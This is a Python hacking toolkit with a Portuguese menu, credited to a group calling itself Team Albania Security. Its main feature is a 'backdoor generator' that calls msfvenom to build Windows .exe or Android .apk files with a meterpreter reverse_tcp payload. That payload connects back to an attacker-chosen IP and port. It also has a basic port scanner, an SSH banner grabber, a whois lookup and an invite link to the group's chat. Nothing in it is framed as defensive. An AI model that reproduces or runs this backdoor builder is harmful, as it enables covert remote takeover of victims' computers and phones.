# --coding: utf-8 --
import os
import sys
import socket

def menu():

	print("""
	|==============MENU DE OPÇÕES==============|
	| [ 1 ] Gerador de Backdoor                |
	| [ 2 ] Portscan                           |
	| [ 3 ] Banner Grabbing                    |
	| [ 4 ] Consulta Whois                     |
	| [ 5 ] Link da Team                       |
	|==========================================|

	}-----{+} Coded By Kira Security {+}-----{
	}-----{+}     11 July 2021       {+}-----{
	}-----{+} Team Albania Security  {+}-----{
	""")

	opção = int(input("Digite a opção que deseja: "))
	os.system("sleep 1")

	if opção == 1:
		def autoback():
			print("""
			|======GERADOR DE BACKDOOR======|
			| [ 1 ] Windows                 |
			| [ 2 ] Android                 |
			|===============================|
			""")
			opção = int(input("Escolha a opção para Windows(1) ou para Android(2): "))

			ip = input("Digite o seu ip: ")
			os.system("sleep 1")

			port = input("Digite a porta, Recomendado 4444: ")
			os.system("sleep 1")

			nome = input("Digite o nome do seu backdoor: ")
			os.system("sleep 1")

			if opção == 1:
        			os.system(f"msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST={ip} LPORT={port} R > {nome}.exe")
			elif opção == 2:
        			os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R > {nome}.apk")
			else:
        			print("Opção inválida, escolha outra opção")

			os.system("sleep 1")
			os.system("clear")

			print("[==                     ]")
			os.system("sleep 1")
			os.system("clear")
			print("[====                   ]")
			os.system("sleep 1")
			os.system("clear")
			print("=============           ]")
			os.system("sleep 1")
			os.system("clear")
			print("[===================    ]")
			os.system("sleep 1")
			os.system("clear")
			print("[=======================]")

			print("BACKDOOR CRIADO COM SUCESSO!")
			os.system("sleep 1")
		autoback()

	if opção == 2:
		def portscan():
			host = input("Digite o alvo: ")
			portas = [80,8080,22,443,53,21,23]

			for porta in portas:
        			meu_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        			meu_socket.settimeout(0.1)
        			codigo = meu_socket.connect_ex((host, porta))
        			if codigo == 0:
                			print("Porta",porta," está aberta")
        			else:
                			print("Porta",porta,"está  fechada")
		portscan()

	if opção == 3:
		def Banner_Grabbing():
			alvo = input("ALVO: ")
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect_ex((alvo, 22))
			print(sock.recv(2048))
			sock.close()
			os.system("sleep 1")
		Banner_Grabbing()
	if opção == 4:
		def Consulta_Whois():
			import whois
			dominio = "IP ALVO"
			consulta_whois = whois.whois(dominio)
			print(consulta_whois.text)
		Consulta_Whois()
	if opção == 5:
		print("Ai está o link da nossa team, entre e faça parte!")
		print("https://chat.whatsapp.com/KOXdTEUngtTFrB47VoCnma")
menu()
